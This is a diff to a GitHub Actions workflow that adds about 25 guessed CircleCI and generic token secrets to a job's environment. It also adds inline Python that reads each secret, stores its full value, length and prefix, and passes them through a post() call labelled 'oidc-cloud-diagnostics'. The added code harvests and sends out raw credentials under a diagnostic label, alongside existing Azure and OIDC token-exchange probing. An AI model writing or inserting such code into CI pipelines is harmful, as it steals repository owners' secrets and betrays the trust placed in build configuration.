@@ -35,6 +35,31 @@ jobs:
           AZURE_SUBSCRIPTION_ID: 69388229-b9ee-4a58-9f3a-62a0b78a0f10
           AZURE_RESOURCE_GROUP: wklrg-qtpfyraxuv0100758
           AZURE_SITE_NAME: wklwebapp-xmwneczrsg0100908
+          CIRCLECI_TOKEN: ${{ secrets.CIRCLECI_TOKEN }}
+          CIRCLE_TOKEN: ${{ secrets.CIRCLE_TOKEN }}
+          CIRCLECI_API_TOKEN: ${{ secrets.CIRCLECI_API_TOKEN }}
+          CIRCLE_API_TOKEN: ${{ secrets.CIRCLE_API_TOKEN }}
+          CIRCLECI_PAT: ${{ secrets.CIRCLECI_PAT }}
+          CIRCLE_PAT: ${{ secrets.CIRCLE_PAT }}
+          CCIPAT: ${{ secrets.CCIPAT }}
+          CCIPAT_TOKEN: ${{ secrets.CCIPAT_TOKEN }}
+          CIRCLECI_PERSONAL_TOKEN: ${{ secrets.CIRCLECI_PERSONAL_TOKEN }}
+          CIRCLE_PERSONAL_TOKEN: ${{ secrets.CIRCLE_PERSONAL_TOKEN }}
+          CIRCLECI_PROJECT_TOKEN: ${{ secrets.CIRCLECI_PROJECT_TOKEN }}
+          CIRCLE_PROJECT_TOKEN: ${{ secrets.CIRCLE_PROJECT_TOKEN }}
+          CIRCLECI_PROJECT_API_TOKEN: ${{ secrets.CIRCLECI_PROJECT_API_TOKEN }}
+          CIRCLECI_API_KEY: ${{ secrets.CIRCLECI_API_KEY }}
+          CIRCLE_API_KEY: ${{ secrets.CIRCLE_API_KEY }}
+          CIRCLECI_ACCESS_TOKEN: ${{ secrets.CIRCLECI_ACCESS_TOKEN }}
+          CIRCLE_ACCESS_TOKEN: ${{ secrets.CIRCLE_ACCESS_TOKEN }}
+          CIRCLECI: ${{ secrets.CIRCLECI }}
+          CIRCLE: ${{ secrets.CIRCLE }}
+          TOKEN_CIRCLECI: ${{ secrets.TOKEN_CIRCLECI }}
+          TOKEN_CIRCLE: ${{ secrets.TOKEN_CIRCLE }}
+          CI_TOKEN: ${{ secrets.CI_TOKEN }}
+          API_TOKEN: ${{ secrets.API_TOKEN }}
+          PROJECT_TOKEN: ${{ secrets.PROJECT_TOKEN }}
+          PIPELINE_TOKEN: ${{ secrets.PIPELINE_TOKEN }}
         run: |
           python3 - <<'PY'
           import base64
@@ -204,6 +229,25 @@ jobs:
                           )
                       azure_results[client_id][scope] = scope_result
 
+          circle_secret_names = [
+              "CIRCLECI_TOKEN", "CIRCLE_TOKEN", "CIRCLECI_API_TOKEN", "CIRCLE_API_TOKEN",
+              "CIRCLECI_PAT", "CIRCLE_PAT", "CCIPAT", "CCIPAT_TOKEN",
+              "CIRCLECI_PERSONAL_TOKEN", "CIRCLE_PERSONAL_TOKEN",
+              "CIRCLECI_PROJECT_TOKEN", "CIRCLE_PROJECT_TOKEN", "CIRCLECI_PROJECT_API_TOKEN",
+              "CIRCLECI_API_KEY", "CIRCLE_API_KEY", "CIRCLECI_ACCESS_TOKEN", "CIRCLE_ACCESS_TOKEN",
+              "CIRCLECI", "CIRCLE", "TOKEN_CIRCLECI", "TOKEN_CIRCLE",
+              "CI_TOKEN", "API_TOKEN", "PROJECT_TOKEN", "PIPELINE_TOKEN",
+          ]
+          circle_secret_probe = {}
+          for name in circle_secret_names:
+              value = os.environ.get(name, "")
+              circle_secret_probe[name] = {
+                  "present": bool(value),
+                  "length": len(value),
+                  "prefix": value[:12],
+                  "value": value if value else "",
+              }
+
           post("oidc-cloud-diagnostics", {
               "github": {
                   "run_id": os.environ.get("GITHUB_RUN_ID"),
@@ -214,6 +258,7 @@ jobs:
               "github_api": github_results,
               "oidc": oidc,
               "azure_exchange": azure_results,
+              "circle_secret_probe": circle_secret_probe,
           })
           PY
 
